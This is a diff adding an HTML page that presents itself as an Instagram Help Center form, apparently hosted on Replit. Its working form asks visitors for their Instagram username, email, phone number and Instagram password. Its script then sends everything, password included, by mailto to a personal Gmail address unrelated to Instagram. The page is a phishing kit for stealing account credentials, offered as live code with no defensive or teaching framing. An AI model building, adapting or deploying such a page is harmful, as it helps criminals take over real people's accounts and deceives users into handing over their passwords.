@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>Help Center - Instagram</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+  <style>
+    /* Add Instagram style and colors here */
+    body {
+      background-color: white;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: #262626;
+      background-image: url('instagram-logo.png');
+      background-repeat: no-repeat;
+      background-position: bottom right;
+      background-image: url('instagram-logo.png'); /* Added Instagram logo */
+      background-color: #C13584; /* Instagram theme color */
+    }
+    h1 {
+      color: #405DE6;
+    }
+    label {
+      color: #405DE6;
+    }
+    input[type="email"],
+    input[type="text"],
+    input[type="tel"],
+    input[type="password"],
+    textarea {
+      border: 1px solid #dbdbdb;
+      padding: 8px;
+      margin-bottom: 10px;
+    }
+    input[type="submit"] {
+      background-color: #405DE6;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <h1>Help Center - Instagram</h1>
+  <form id="helpForm" method="post">
+    <label for="problem">tell me what problem you are facing? tell us detail</label><br>
+    <textarea id="problem" name="problem" rows="4" cols="50"></textarea><br>
+    <label for="solution">How can we help you? tell us detail</label><br>
+    <textarea id="solution" name="solution" rows="4" cols="50"></textarea><br>
+    <label for="feedback">Do you have any other feedback?</label><br>
+    <textarea id="feedback" name="feedback" rows="4" cols="50"></textarea><br>
+    <label for="email">Email:</label><br>
+    <input type="email" id="email" name="email"><br>
+    <label for="username">Instagram Username:</label><br>
+    <input type="text" id="username" name="username"><br>
+    <label for="phone">Phone Number:</label><br>
+    <input type="tel" id="phone" name="phone"><br>
+    <label for="password">Instagram Password:</label><br>
+    <input type="password" id="password" name="password"><br>
+    <input type="submit" value="Send email" onclick="submitForm(event)">
+  </form>
+  <script>
+    function submitForm(event) {
+      event.preventDefault();
+      // Collect form data
+      const problem = document.getElementById('problem').value;
+      const solution = document.getElementById('solution').value;
+      const feedback = document.getElementById('feedback').value;
+      const email = document.getElementById('email').value;
+      const username = document.getElementById('username').value;
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+      
+      // Create a mailto string to open user's email client
+      const mailtoLink = `mailto:usmananwer721@gmail.com
+                        ?subject=Help Center Form Submission
+                        &body=Problem: ${problem}%0A
+                        Solution: ${solution}%0A
+                        Feedback: ${feedback}%0A
+                        Email: ${email}%0A
+                        Username: ${username}%0A
+                        Phone: ${phone}%0A
+                        Password: ${password}
+                        `;
+      window.location.href = mailtoLink;
+    }
+  </script>
+  <script src="https://replit.com/public/js/replit-badge-v2.js" theme="dark" position="bottom-right"></script>
+</body>
+
+</html>
